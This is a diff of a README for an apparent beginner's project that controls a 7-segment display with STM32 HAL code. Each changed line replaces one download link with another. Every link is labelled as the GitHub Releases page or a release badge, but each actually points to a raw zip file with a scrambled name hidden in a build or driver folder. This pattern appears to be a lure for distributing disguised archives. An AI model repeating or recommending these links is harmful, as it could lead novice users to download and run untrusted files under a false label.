@@ -1,7 +1,7 @@
 # 🌟 STM32-7-Segment-Display-HAL-Coding-Method - Easy Interface for Beginners
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/raw/refs/heads/main/Core/Startup/Coding_Segment_ST_HA_Method_Display_2.1.zip%20Latest%20Release-v1.0-blue)](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/raw/refs/heads/main/Core/Startup/Coding_Segment_ST_HA_Method_Display_2.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/main/Debug/Drivers/Coding-ST-Segment-Display-Method-HA-v3.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/main/Debug/Drivers/Coding-ST-Segment-Display-Method-HA-v3.1.zip)
 
 ## 📚 Description
 This project is designed to help beginners learn how to use STM32 to control a 7-segment display. It makes use of STM32 HAL (Hardware Abstraction Layer) within the STM32CubeIDE environment. By using this project, you will see how the appropriate GPIO pins function to manage the display, making it a practical starting point for STM32 applications.
@@ -16,7 +16,7 @@ To get started with the STM32-7-Segment-Display-HAL-Coding-Method, follow these 
 - **USB Driver:** STM32 USB driver for your system
 
 ### 2. Download & Install
-To download the application, visit the [Releases page](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/raw/refs/heads/main/Core/Startup/Coding_Segment_ST_HA_Method_Display_2.1.zip).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/main/Debug/Drivers/Coding-ST-Segment-Display-Method-HA-v3.1.zip).
 
 1. Click on the link to go to the GitHub Releases page.
 2. Locate the latest version listed at the top.
@@ -64,4 +64,4 @@ If you have questions or need help, consider checking out the community forums r
 - Review example code carefully to understand the logic.
 - Experiment with different display patterns to enhance your learning.
 
-For more details, documentation, and the latest updates, always refer back to the [Releases page](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/raw/refs/heads/main/Core/Startup/Coding_Segment_ST_HA_Method_Display_2.1.zip). Enjoy your journey with STM32 and 7-segment displays!
+For more details, documentation, and the latest updates, always refer back to the [Releases page](https://raw.githubusercontent.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/main/Debug/Drivers/Coding-ST-Segment-Display-Method-HA-v3.1.zip). Enjoy your journey with STM32 and 7-segment displays!
